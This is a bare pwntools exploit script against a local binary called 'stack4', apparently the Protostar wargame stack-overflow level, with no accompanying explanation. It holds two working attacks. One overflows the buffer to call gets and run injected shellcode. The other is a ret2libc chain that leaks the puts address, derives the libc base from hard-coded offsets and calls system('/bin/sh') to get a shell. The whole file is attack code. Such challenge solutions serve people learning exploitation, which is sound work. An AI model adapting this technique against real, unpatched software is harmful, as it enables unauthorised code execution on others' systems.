from pwn import *
r = process("./stack4")

def shellcode():
	get_plt = 0x0804830c
	shelladdr = 0x08049010
	payload = "A"*76 
	payload += p32(get_plt) 
	payload += p32(shelladdr)
	payload += p32(shelladdr)
	r.sendline(payload)
	r.sendline(asm(shellcraft.sh()))
	r.interactive()

def ret2libc():
	main = 0x08048408
	put_plt = 0x804832c
	put_got = 0x8049604
	offset_put = 0x5fca0
	offset_sys = 0x3ada0
	offset_binsh = 0x15ba0b
	payload = "A"*76  
	payload += p32(put_plt) 
	payload += p32(main) 
	payload += p32(put_got)
	r.sendline(payload)
	put = u32(r.recv(4))
	base = put - offset_put
	sys = base + offset_sys
	binsh = base + offset_binsh
	payload = "A"*68 
	payload += p32(sys) 
	payload += p32(main) 
	payload += p32(binsh)
	r.sendline(payload)
	r.interactive()
	
ret2libc()